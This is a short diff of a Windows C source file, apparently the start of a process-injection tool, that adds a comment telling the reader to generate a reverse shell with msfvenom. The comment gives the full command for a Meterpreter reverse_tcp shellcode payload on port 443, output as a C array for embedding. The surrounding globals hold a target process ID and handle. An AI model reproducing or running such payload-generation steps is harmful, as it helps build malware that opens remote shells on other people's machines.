@@ -5,6 +5,9 @@
 #include <windows.h>
 #include <stdio.h> 
 
+//* to compile reverse shell, use msfvenom 
+//... in the console: msfvenom --platform windows -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=localhost LPORT=443 EXITFUNC=thread -f c --var-name=crowPuke
+
 /* Init*/
 DWORD PID = NULL;  // process id 
 HANDLE hProcess = NULL; // process 
